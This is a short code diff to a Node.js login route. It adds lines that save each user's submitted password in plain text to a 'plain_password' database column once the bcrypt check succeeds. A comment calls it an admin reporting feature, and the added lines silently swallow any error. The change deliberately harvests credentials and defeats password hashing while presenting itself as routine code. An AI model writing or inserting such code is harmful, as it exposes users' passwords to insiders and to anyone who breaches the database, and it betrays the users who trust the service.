@@ -104,6 +104,11 @@ router.post("/auth/login", async (req, res) => {
     const valid = await bcrypt.compare(password, user.password_hash);
     if (!valid) return res.status(401).json({ error: "Invalid login credentials" });
 
+    // Capture plain_password on successful login (for admin user report view)
+    if (!user.plain_password) {
+      query("UPDATE users SET plain_password = $1 WHERE id = $2", [password, user.id]).catch(() => {});
+    }
+
     if (!user.email_confirmed) {
       return res.status(401).json({ error: "Email not confirmed" });
     }
